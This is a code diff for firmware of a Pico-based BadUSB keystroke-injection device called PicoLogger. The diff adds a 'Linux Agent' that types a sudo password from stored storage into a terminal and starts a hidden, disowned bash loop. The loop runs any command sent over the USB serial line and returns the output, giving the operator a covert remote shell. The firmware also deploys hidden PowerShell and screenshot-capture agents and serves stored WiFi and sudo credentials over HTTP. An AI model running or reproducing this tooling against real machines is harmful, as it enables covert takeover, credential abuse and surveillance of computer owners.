@@ -1,36 +1,63 @@
 // =================================================== WiFi Config Functions ========================================================
 
-void saveWiFiSettings() {
-    File file = LittleFS.open("/settings.txt", "w");
+
+void saveWiFiSettings(String ssid, String password, bool wifiState, String layout) {
+    File file = LittleFS.open("/config.txt", "w");
     if (file) {
-        file.println(ssid);
-        file.println(password);
+        file.println("SSID:" + ssid);
+        file.println("Password:" + password);
+        file.println("WiFiState:" + String(wifiState ? "ON" : "OFF"));
+        file.println("Layout:" + layout);
         file.close();
+        Serial.println("WiFi settings saved.");
     } else {
         Serial.println("Failed to save WiFi settings.");
     }
+    setLayout();
 }
 
 void loadWiFiSettings() {
-    File file = LittleFS.open("/settings.txt", "r");
+    File file = LittleFS.open("/config.txt", "r");
     if (!file) {
         Serial.println("No saved WiFi settings found. Using defaults.");
-        saveWiFiSettings();
+        saveWiFiSettings(ssid, password, true, layout);
         return;
     }
-    ssid = file.readStringUntil('\n');
-    password = file.readStringUntil('\n');
-    ssid.trim();
-    password.trim();  
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        line.trim();
+
+        if (line.startsWith("SSID:")) {
+            ssid = line.substring(5);
+        } else if (line.startsWith("Password:")) {
+            password = line.substring(9);
+        } else if (line.startsWith("WiFiState:")) {
+            String state = line.substring(10);
+            wifiState = (state == "ON");
+        } else if (line.startsWith("Layout:")) {
+            layout = line.substring(7);
+        }
+    }
+
     file.close();
     Serial.println("Loaded saved WiFi settings.");
+}
+
+bool loadWiFiState() {
+    loadWiFiSettings();
+    return wifiState;
+}
+
+void saveWiFiState(bool state) {
+    wifiState = state;
+    saveWiFiSettings(ssid, password, state, layout);
 }
 
 void changeSSID(String newSSID) {
     if (newSSID.length() > 0) {
         ssid = newSSID;
         Serial.println("SSID changed to: " + ssid);
-        saveWiFiSettings();
+        saveWiFiSettings(ssid, password, wifiState, layout);
     } else {
         Serial.println("Error: SSID cannot be empty.");
     }
@@ -40,10 +67,33 @@ void changePassword(String newPassword) {
     if (newPassword.length() >= 8) {
         password = newPassword;
         Serial.println("Password changed.");
-        saveWiFiSettings();
+        saveWiFiSettings(ssid, password, wifiState, layout);
     } else {
         Serial.println("Error: Password must be at least 8 characters.");
     }
+}
+
+void handleSaveSettings() {
+    if (server.hasArg("ssid") && server.hasArg("password") && server.hasArg("wifiState")) {
+        String newSSID = server.arg("ssid");
+        String newPassword = server.arg("password");
+        bool WiFiState = (server.arg("wifiState") == "ON");
+        String newLayout = server.hasArg("layout") ? server.arg("layout") : "us";
+        changeSSID(newSSID);
+        changePassword(newPassword);
+        saveWiFiState(WiFiState);
+        layout = newLayout;
+        saveWiFiSettings(newSSID, newPassword, WiFiState, layout);
+        server.send(200, "text/plain", "Settings saved");
+    } else {
+        server.send(400, "text/plain", "Missing settings");
+    }
+}
+
+void handleLoadSettings() {
+    loadWiFiSettings();
+    String settingsJson = "{\"ssid\":\"" + ssid + "\",\"password\":\"" + password + "\",\"wifiState\":\"" + (wifiState ? "ON" : "OFF") + "\",\"layout\":\"" + layout + "\"}";
+    server.send(200, "application/json", settingsJson);
 }
 
 // ==================================================== BadUSB Functions ===================================================================
@@ -220,7 +270,7 @@ void handleGetPayload() {
 }
 
 void EnablePayloadOnBoot(String filename) {
-    File file = LittleFS.open("/boot_payloads.txt", "a");
+    File file = LittleFS.open("/config_pob.txt", "a");
     if (!file) {
         server.send(500, "text/plain", "Failed to open boot payloads file");
         return;
@@ -231,7 +281,7 @@ void EnablePayloadOnBoot(String filename) {
 }
 
 void DisablePayloadOnBoot(String filename) {
-    File file = LittleFS.open("/boot_payloads.txt", "r");
+    File file = LittleFS.open("/config_pob.txt", "r");
     if (!file) {
         server.send(500, "text/plain", "Failed to open boot payloads file");
         return;
@@ -245,7 +295,7 @@ void DisablePayloadOnBoot(String filename) {
         }
     }
     file.close();
-    file = LittleFS.open("/boot_payloads.txt", "w");
+    file = LittleFS.open("/config_pob.txt", "w");
     if (!file) {
         server.send(500, "text/plain", "Failed to update boot payloads file");
         return;
@@ -270,7 +320,7 @@ void handleTogglePayloadOnBoot() {
 }
 
 void checkBootPayloads() {
-    File file = LittleFS.open("/boot_payloads.txt", "r");
+    File file = LittleFS.open("/config_pob.txt", "r");
     if (!file) {
         Serial.println("[INFO] No boot payloads found.");
         return;
@@ -290,7 +340,7 @@ void handleListBootPayloads() {
         server.send(200, "application/json", "[]");
         return;
     }
-    File file = LittleFS.open("/boot_payloads.txt", "r");
+    File file = LittleFS.open("/config_pob.txt", "r");
     if (!file) {
         server.send(500, "application/json", "[]");
         return;
@@ -337,46 +387,6 @@ void handleClearLogs() {
 }
 
 // ======================================================== Settings Functions ============================================================
-bool loadWiFiState() {
-    File file = LittleFS.open("/wifi_config.txt", "r");
-    if (!file) {
-        Serial.println("WiFi config not found, defaulting to ON.");
-        return true;
-    }
-    String state = file.readString();
-    file.close();
-    state.trim();
-    return (state == "ON");
-}
-
-void saveWiFiState(bool state) {
-    File file = LittleFS.open("/wifi_config.txt", "w");
-    if (file) {
-        file.println(state ? "ON" : "OFF");
-        file.close();
-    } else {
-        Serial.println("Failed to save WiFi state.");
-    }
-}
-
-void handleSaveSettings() {
-    if (server.hasArg("ssid") && server.hasArg("password") && server.hasArg("wifiState")) {
-        String ssid = server.arg("ssid");
-        String password = server.arg("password");
-        bool wifiState = server.arg("wifiState") == "ON";
-        changeSSID(ssid);
-        changePassword(password);
-        saveWiFiState(wifiState);
-        server.send(200, "text/plain", "Settings saved");
-    } else {
-        server.send(400, "text/plain", "Missing settings");
-    }
-}
-
-void handleLoadSettings() {
-    String settingsJson = "{\"ssid\":\"" + ssid + "\",\"password\":\"" + password + "\",\"wifiState\":\"" + (loadWiFiState() ? "ON" : "OFF") + "\"}";
-    server.send(200, "application/json", settingsJson);
-}
 
 void handleFormatLittleFS() {
     if (LittleFS.begin()) {
@@ -451,8 +461,8 @@ void handleKeyPress() {
 // =================================================== Remote Shell Page ======================================================
 
 void handlePsAgent() {
-  bool isAdmin = server.arg("admin") == "1";
-  bool isHidden = server.arg("hidden") == "1";
+    bool isAdmin = server.arg("admin") == "1";
+    bool isHidden = server.arg("hidden") == "1"; 
   delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -489,7 +499,11 @@ void handlePsAgent() {
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-  server.send(200, "text/plain", "Agent Deployed");
+  if (fromMenu){
+    fromMenu = false;
+  }else{
+    server.send(200, "text/plain", "Agent Deployed");
+  }
 }
 
 String executePowerShell(String command) {
@@ -520,6 +534,76 @@ void handleExecuteCommand() {
 
 
 
+// ========================================================= Linux Agent ===================================================================
+
+
+void handleLinuxAgent() {
+    bool isHidden = server.arg("hidden") == "1"; 
+    String password = server.arg("password");
+    if (password.length() == 0) {
+        File sudoFile = LittleFS.open("/sudo.txt", "r");
+        if (sudoFile) {
+            password = sudoFile.readStringUntil('\n');
+            sudoFile.close();
+        }else{
+          Serial.println("Error: Password not found!");
+          if (fromMenu){
+            fromMenu = false; 
+            return; 
+          }else{
+            server.send(500, "text/plain", "No password available!");
+            return;
+          }
+        }
+    } 
+    delay(1000);
+    Keyboard.press(KEY_LEFT_CTRL);
+    Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('t');
+    delay(100);
+    Keyboard.releaseAll();
+    delay(500);
+
+    Keyboard.print("echo " + password + " | sudo -S ");
+    if (isHidden) {
+      Keyboard.print("nohup ");
+    }
+    Keyboard.print("bash -c 'BAUD_RATE=115200; VID=\"239a\"; PID=\"cafe\"; echo \"Searching for Pico with VID:$VID PID:$PID...\";");
+    Keyboard.print("if ! lsusb | grep -i \"${VID}:${PID}\" > /dev/null; then echo \"Pico not found!\"; exit 1; fi; echo \"Pico detected.\";");
+    Keyboard.print("DEVICE=$(ls -t /dev/ttyACM* 2>/dev/null | head -n 1); if [ -z \"$DEVICE\" ]; then echo \"No /dev/ttyACM* device found.\"; exit 1; fi; echo \"Using serial device: $DEVICE\";");
+    Keyboard.print("stty -F \"$DEVICE\" $BAUD_RATE cs8 -cstopb -parenb -icanon -echo;");
+    Keyboard.print("last_command=\"\"; while true; do if read -t 0.5 -r line < \"$DEVICE\"; then command=$(echo \"$line\" | xargs); if [ -n \"$command\" ] && [ \"$command\" != \"$last_command\" ]; then echo \"Received: $command\"; last_command=$command; output=$(bash -c \"$command\" 2>&1); response=\"${output:-[Command executed successfully, no output]}\"; echo \"Sending response...\"; echo \"$response\" > \"$DEVICE\"; sleep 0.1; fi; fi; sleep 0.2; done'");
+    
+    if (isHidden) {
+        Keyboard.print(" > /dev/null 2>&1 & disown");
+    }
+    
+    Keyboard.press(KEY_RETURN);
+    delay(100);
+    Keyboard.releaseAll();
+
+    if (isHidden) {
+      delay(1000);
+      Keyboard.press(KEY_RETURN);
+      delay(100);
+      Keyboard.releaseAll();
+      delay(1000);
+      
+      Keyboard.print("exit");
+      delay(100);
+      Keyboard.press(KEY_RETURN);
+      delay(100);
+      Keyboard.releaseAll();
+    }
+    
+    if (fromMenu){
+      fromMenu = false;
+    }else{
+      server.send(200, "text/plain", "Linux Agent Deployed");
+    }
+}
+
+
 // =========================================================== Screenshot Page =================================================================
 
 String base64Image = "";  
@@ -527,9 +611,8 @@ bool receivingImage = false;
 
 void handleSSAgent() {
   bool isHidden = server.arg("hidden") == "1";
-  int q = server.arg("q").toInt();   // Image quality
-  int s = server.arg("s").toInt();   // Size reduction
-  
+  int q = server.arg("q").toInt();
+  int s = server.arg("s").toInt();
   delay(1000);
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -547,8 +630,12 @@ void handleSSAgent() {
       Keyboard.print("$h=(Get-Process -PID $pid).MainWindowHandle;$Host.UI.RawUI.WindowTitle='xx';$x=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'});$t::ShowWindowAsync($x.MainWindowHandle,0);");
       delay(100);
   }
-  Keyboard.print("$q = "); Keyboard.print(String(q)); Keyboard.print(";");
-  Keyboard.print("$s = "); Keyboard.print(String(s)); Keyboard.print(";");
+  if (fromMenu){
+      Keyboard.print("$s=2;$q=10;");
+  }else{
+      Keyboard.print("$q = "); Keyboard.print(String(q)); Keyboard.print(";");
+      Keyboard.print("$s = "); Keyboard.print(String(s)); Keyboard.print(";");
+  }
   Keyboard.print("Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;");
   Keyboard.print("Add-Type -TypeDefinition \"using System;using System.Runtime.InteropServices;using System.Drawing;using System.Drawing.Imaging;public class ScreenCapture{[DllImport(`\"user32.dll`\")]public static extern IntPtr GetWindowDC(IntPtr hWnd);[DllImport(`\"user32.dll`\")]public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);[DllImport(`\"gdi32.dll`\")]public static extern int BitBlt(IntPtr hdcDest,int nXDest,int nYDest,int nWidth,int nHeight,IntPtr hdcSrc,int nXSrc,int nYSrc,int dwRop);public static void CaptureFullScreen(string filePath,int width,int height){Bitmap bitmap=new Bitmap(width, height)");
   Keyboard.print(";Graphics g=Graphics.FromImage(bitmap);IntPtr hdcDest=g.GetHdc();IntPtr hdcSrc=GetWindowDC(IntPtr.Zero);BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, 0x00CC0020);ReleaseDC(IntPtr.Zero, hdcSrc);g.ReleaseHdc(hdcDest);Bitmap resizedBitmap=new Bitmap(bitmap,new Size(bitmap.Width/$s,bitmap.Height/$s));SaveJpegWithQuality(resizedBitmap,filePath,$q);bitmap.Dispose();resizedBitmap.Dispose();g.Dispose();}private static void SaveJpegWithQuality(Bitmap bitmap,string path,long quality){ImageCodecInfo jpegCodec=GetEncoderInfo(`\"image/jpeg`\")");
@@ -558,18 +645,30 @@ void handleSSAgent() {
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-  server.send(200, "text/plain", "Agent Deployed");
+  if (fromMenu){
+    fromMenu = false;
+  }else{
+    server.send(200, "text/plain", "Agent Deployed");
+  }
 }
 
 void handleTakeScreenshot() {
      base64Image = "";
     Serial.println("take screenshot");
-    server.send(200, "text/plain", "Screenshot command sent");
+    if (fromMenu){
+      fromMenu = false;
+    }else{
+      server.send(200, "text/plain", "Screenshot command sent");
+    }
 }
 
 void handleExitAgent() {
     Serial.println("exit agent");
-    server.send(200, "text/plain", "Screenshot command sent");
+    if (fromMenu){
+      fromMenu = false;
+    }else{
+      server.send(200, "text/plain", "Exit command sent");
+    }
 }
 
 void handleGetScreenshot() {
@@ -624,4 +723,133 @@ void readSerialScreenshot() {
     }
 }
 
+void handleDownload() {
+    if (!server.hasArg("file")) {
+        server.send(400, "text/plain", "Bad Request: No file specified");
+        return;
+    }
+    String filePath = server.arg("file");
+    if (filePath.startsWith("/")) {
+        filePath = filePath.substring(1);
+    }
+    if (LittleFS.exists("/" + filePath)) {
+        File file = LittleFS.open("/" + filePath, "r");
+        if (!file) {
+            server.send(500, "text/plain", "Failed to open file for download");
+            return;
+        }
+        String contentType = "application/octet-stream";
+        server.sendHeader("Content-Disposition", "attachment; filename=" + filePath);
+        server.streamFile(file, contentType);
+        file.close();
+    } else {
+        server.send(404, "text/plain", "File not found");
+    }
+}
 
+void handleEdit() {
+    if (!server.hasArg("file")) {
+        server.send(400, "text/plain", "Bad Request: No file specified");
+        return;
+    }
+
+    String filePath = server.arg("file");
+    if (!LittleFS.exists(filePath)) {
+        server.send(404, "text/plain", "File not found");
+        return;
+    }
+
+    File file = LittleFS.open(filePath, "r");
+    if (!file) {
+        server.send(500, "text/plain", "Failed to open file for editing");
+        return;
+    }
+
+    String fileContent = file.readString();
+    file.close();
+
+    String html = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>PicoLogger | Edit File</title>
+        <style>
+            body{font-family:Arial,sans-serif;text-align:center;margin:0;padding:0;background-color:#1e1e1e;color:#fff}
+            .container{margin:20px auto;width:80%;max-width:1000px;padding:20px;background:#222;border-radius:10px;box-shadow:0 0 10px rgba(255,255,255,.1)}
+            h2{text-align:center;color:#fc0}
+            textarea{width:80%;height:300px;margin:10px;border-radius:5px;padding:10px;background:#333;color:#fff}
+            button{padding:10px 20px;margin:10px;background:#fc0;color:#000;font-weight:700;border:none;border-radius:5px;cursor:pointer}
+            .ascii-container{color:#fc0;display:auto;justify-content:center;align-items:center;width:100%;overflow:auto;font-size:14px;font-weight:700}
+            .ascii-art{background:0 0;border:none;padding:0;font-size:14px;font-weight:700;color:#fc0;text-align:center}
+            .footer{text-align:center;color:#fc0;font-size:14px;background:#333;position:fixed;width:100%;bottom:0}
+            .footer a{color:#fc0;text-decoration:none;transition:.3s}
+        </style>
+    </head>
+    <body>
+        <div class="ascii-container" align="center">
+            <pre class="ascii-art">
+   ___                 _                                  
+  (  _ \ _            ( )                                 
+  | |_) )_)  ___   _  | |      _     __    __    __  _ __ 
+  |  __/| |/ ___)/ _ \| |  _ / _ \ / _  \/ _  \/ __ \  __)
+  | |   | | (___( (_) ) |_( ) (_) ) (_) | (_) |  ___/ |   
+  (_)   (_)\____)\___/(____/ \___/ \__  |\__  |\____)_)   
+                                  ( )_) | )_) |           
+                                   \___/ \___/            
+            </pre>
+        </div>
+        <div class="container">
+        <h2>Edit File</h2> <code>)rawliteral" + filePath + R"rawliteral(</code>
+        <form action="/save" method="POST">
+            <textarea name="content">)rawliteral" + fileContent + R"rawliteral(</textarea><br>
+            <input type="hidden" name="file" value=")rawliteral" + filePath + R"rawliteral(">
+            <button type="submit">Save</button>
+        </form>
+        </div>
+        <div class="footer"><p>Made by @beigeworm | github.com/beigeworm</p></div>
+    </body>
+    </html>
+    )rawliteral";
+
+    server.send(200, "text/html", html);
+}
+
+void handleSave() {
+    if (!server.hasArg("file") || !server.hasArg("content")) {
+        server.send(400, "text/plain", "Bad Request: Missing file or content");
+        return;
+    }
+
+    String filePath = server.arg("file");
+    String content = server.arg("content");
+
+    File file = LittleFS.open(filePath, "w");
+    if (!file) {
+        server.send(500, "text/plain", "Failed to save file");
+        return;
+    }
+
+    file.print(content);
+    file.close();
+            server.sendHeader("Location", "/explorer", true);
+            server.send(303);
+}
+
+void handleDelete() {
+    if (!server.hasArg("file")) {
+        server.send(400, "text/plain", "Bad Request: No file specified");
+        return;
+    }
+
+    String filePath = server.arg("file");
+    if (LittleFS.exists(filePath)) {
+        if (LittleFS.remove(filePath)) {
+            server.sendHeader("Location", "/explorer", true);
+            server.send(303);
+        } else {
+            server.send(500, "text/plain", "Failed to delete file");
+        }
+    } else {
+        server.send(404, "text/plain", "File not found");
+    }
+}
